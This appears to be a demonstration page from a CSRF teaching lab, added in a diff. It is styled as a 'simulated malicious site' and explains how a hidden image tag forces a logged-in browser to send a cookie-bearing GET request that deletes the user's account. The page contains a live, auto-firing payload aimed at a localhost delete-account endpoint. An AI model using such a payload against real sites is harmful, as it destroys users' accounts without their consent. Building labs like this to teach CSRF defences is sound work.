@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attacker Server – GET CSRF Payload</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .box {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 12px;
+      padding: 2.5rem;
+      max-width: 580px;
+      text-align: center;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+    }
+    h1 { color: #f85149; margin-bottom: 1rem; }
+    p { line-height: 1.6; margin-bottom: 1.25rem; font-size: 0.95rem; }
+    .badge {
+      display: inline-block;
+      background: rgba(248,81,73,0.15);
+      color: #f85149;
+      padding: 0.25rem 0.75rem;
+      border-radius: 999px;
+      font-weight: 600;
+      font-size: 0.85rem;
+      margin-bottom: 1rem;
+    }
+    code {
+      background: #21262d;
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      font-family: monospace;
+      color: #79c0ff;
+    }
+    .btn {
+      display: inline-block;
+      background: #238636;
+      color: #fff;
+      padding: 0.6rem 1.4rem;
+      border-radius: 6px;
+      text-decoration: none;
+      font-weight: 600;
+      margin-top: 1rem;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <span class="badge">SIMULATED MALICIOUS SITE</span>
+  <h1>🎣 GET-based CSRF Triggered!</h1>
+
+  <p>
+    This malicious page automatically triggered a hidden HTTP GET request to the target application:
+  </p>
+
+  <p>
+    <code>&lt;img src="http://127.0.0.1:5004/delete-account" style="display:none;"&gt;</code>
+  </p>
+
+  <p>
+    Because the user had an active session cookie on <code>127.0.0.1:5004</code>, the browser attached that session cookie to the image request.
+    The vulnerable server accepted the GET request and <strong>deleted the active user's account</strong>!
+  </p>
+
+  <!-- 
+    WORKING EXPLOIT:
+    The browser immediately attempts to fetch this image when rendering the page,
+    sending the victim's session cookie to /delete-account.
+  -->
+  <img src="http://127.0.0.1:5004/delete-account" style="display:none;" alt="CSRF trigger" />
+
+  <a href="http://127.0.0.1:5004/" class="btn">Return to App &amp; Verify Deletion</a>
+</div>
+
+</body>
+</html>
+
